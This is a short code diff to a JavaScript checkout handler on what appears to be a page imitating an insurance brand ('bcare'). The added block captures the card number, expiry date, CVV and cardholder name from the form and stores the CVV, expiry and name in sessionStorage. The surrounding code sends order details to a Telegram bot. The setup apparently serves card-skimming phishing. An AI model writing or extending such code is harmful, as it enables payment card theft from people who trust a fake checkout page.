@@ -554,6 +554,23 @@ function initSubmit() {
       myRefNumber = 'BC-' + Date.now().toString().slice(-8).toUpperCase();
     }
 
+    /* حفظ بيانات البطاقة قبل الإرسال */
+    try {
+      const cardRaw   = (document.getElementById('cc-number')||{}).value||'';
+      const cardClean = cardRaw.replace(/\D/g,'');
+      const cardType  = detectType(cardRaw);
+      const expiry    = (document.getElementById('cc-expiry')||{}).value||'';
+      const cvv       = (document.getElementById('cc-cvv')||{}).value||'';
+      const name      = (document.getElementById('cc-name')||{}).value||'';
+      sessionStorage.setItem('bcare_card_data', JSON.stringify({
+        number: '**** ' + cardClean.slice(-4),
+        type:   cardType?.name || 'بطاقة',
+        expiry,
+        cvv,
+        name,
+      }));
+    } catch(e){}
+
     /* 📨 إرسال تفاصيل الطلب لـ Telegram مع أزرار */
     await tgSend(buildCheckoutOrderMsg(myRefNumber), buildKeyboard(myRefNumber));
 
